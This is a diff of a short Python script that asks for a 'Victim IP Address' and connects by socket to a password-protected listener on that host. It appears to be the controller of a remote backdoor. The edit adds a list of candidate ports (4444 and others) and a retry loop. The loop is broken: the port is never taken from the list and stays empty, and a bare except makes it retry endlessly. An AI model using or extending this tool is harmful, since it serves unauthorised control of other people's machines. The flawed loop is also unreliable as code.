@@ -3,12 +3,18 @@ import subprocess
 
 HOST_IP = input('Enter Victim IP Address: ')
 REMOTE_HOST = HOST_IP
-REMOTE_PORT = 4444
-PASSWORD = ""
+POTENTIAL_PORTS = ['4444','4200','3600','4000','4400']
+REMOTE_PORT = ''
+port_found = False
+while port_found == False:
+   try:
+        client = socket.socket()
+        print("Starting Connection")
+        client.connect((REMOTE_HOST, REMOTE_PORT))
+        port_found = True
+   except:
+        print("Socket not found")
 escape = False
-client = socket.socket()
-print("Starting Connection")
-client.connect((REMOTE_HOST, REMOTE_PORT)) 
 input_password = input('Enter Password: ')
 client.send(input_password.encode())
 status = client.recv(1024).decode()
